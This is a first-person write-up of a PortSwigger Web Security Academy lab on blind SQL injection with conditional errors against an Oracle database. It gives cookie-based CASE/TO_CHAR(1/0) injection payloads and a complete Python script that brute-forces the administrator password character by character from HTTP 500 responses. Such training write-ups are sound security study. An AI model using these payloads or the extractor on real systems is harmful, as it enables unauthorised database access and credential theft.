# Lab: Blind SQL injection with conditional errors

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  

## 🎯 Objective
The application contains a blind SQL injection vulnerability in the tracking cookie. The application does not return data or alter its content based on query results, but it does throw a custom error page (HTTP 500) if the SQL query causes a database error. The goal is to weaponize these conditional errors to extract the `administrator` password.

## 🕵️‍♂️ Analysis
Because the application is completely blind regarding text output, we must build a True/False oracle based on server behavior. We can achieve this by forcing the database to evaluate a mathematical impossibility (like dividing by zero) only when our injected condition is true.

This lab utilizes an Oracle database, requiring strict syntax including the `dual` dummy table and the `TO_CHAR()` function for type matching. By injecting a `CASE` statement, we dictate the logic:
* **If True:** Execute `1/0` ➡️ Database crashes ➡️ Server returns HTTP 500.
* **If False:** Execute `''` (do nothing) ➡️ Database survives ➡️ Server returns HTTP 200.

## 🚀 Payload & Execution

### Step 1: Prove the Oracle
I intercepted the request in Burp Suite Repeater and verified the conditional error logic by appending concatenated subqueries to a valid `TrackingId`.
* **True Test:** `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` (Returned 500 Internal Server Error)
* **False Test:** `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` (Returned 200 OK)

### Step 2: Character Extraction via Automation
With the oracle established, I adapted my previous Python extraction script. I updated the payload to use Oracle's `SUBSTR()` function to check the `administrator` password character by character, and modified the script's logic to check for a `500` status code rather than specific HTML text.

**Custom Python Extractor (`error_sqli.py`):**
```python
import requests
import sys

url = "https://[LAB_ID].web-security-academy.net/"
session_cookie = "[SESSION_ID]"
tracking_id = "[BASE_TRACKING_ID]" 

charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[*] Starting Error-Based Blind SQLi Extraction...")

# use ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20-- to determine password length first using burp suite
for position in range(1, 21):
    for char in charset:
        payload = f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password, {position}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        headers = {"Cookie": f"TrackingId={payload}; session={session_cookie}"}
        
        response = requests.get(url, headers=headers)
        
        # If the database crashes (500), our guessed character is correct
        if response.status_code == 500:
            password += char
            sys.stdout.write(f"\r[*] Extracting Password: {password}")
            sys.stdout.flush()
            break 

print(f"\n\n[+] Extraction Complete!")
print(f"[+] Administrator Password: {password}")
```

### Step 3: Login
Result: The script successfully triggered the conditional errors and extracted the password: `oz2dio60vicgsk4xtoer`. Logging in with these credentials solved the lab.
